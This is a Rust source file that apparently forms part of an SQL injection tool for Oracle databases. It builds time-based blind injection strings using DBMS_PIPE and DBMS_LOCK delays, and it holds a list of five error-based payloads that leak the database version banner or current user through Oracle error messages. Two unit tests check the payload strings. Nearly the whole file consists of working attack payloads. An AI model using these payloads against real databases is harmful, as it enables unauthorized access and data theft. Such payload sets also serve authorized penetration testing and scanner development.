#![deny(unsafe_code)]
#[must_use]
pub fn oracle_time(secs: u64) -> String {
    format!("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{secs}) --")
}

/// Alternate channel: `DBMS_LOCK.SLEEP` where `DBMS_PIPE` is blocked.
#[must_use]
pub fn oracle_time_lock(secs: u64) -> String {
    format!("' AND DBMS_LOCK.SLEEP({secs}) --")
}

/// Canonical Oracle error-based set — legacy first (compat), then variants.
///
/// - `[0]` legacy `CTXSYS.DRITHSX.SN` — banner leak channel
/// - `[1]` legacy `UTL_INADDR.GET_HOST_ADDRESS`
/// - `TO_NUMBER(banner)` — ORA-01722 (`invalid number`) channel
/// - `XMLTYPE(banner)` — `ORA-06502` / XML parsing error channel
/// - `DBMS_XDB.GETREPOSITORYRESCONTENT(banner)` — XDB URI error channel
#[must_use]
pub fn oracle_error_payloads() -> Vec<String> {
    vec![
        "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --"
            .to_owned(),
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) --".to_owned(),
        "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) --".to_owned(),
        "' AND XMLTYPE((SELECT banner FROM v$version WHERE ROWNUM=1))='1' --".to_owned(),
        "' AND 1=DBMS_XDB.GETREPOSITORYRESCONTENT((SELECT banner FROM v$version WHERE ROWNUM=1)) --"
            .to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_shape() {
        assert_eq!(oracle_time(5), "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --");
    }

    #[test]
    fn lock_shape() {
        assert_eq!(oracle_time_lock(5), "' AND DBMS_LOCK.SLEEP(5) --");
    }
}
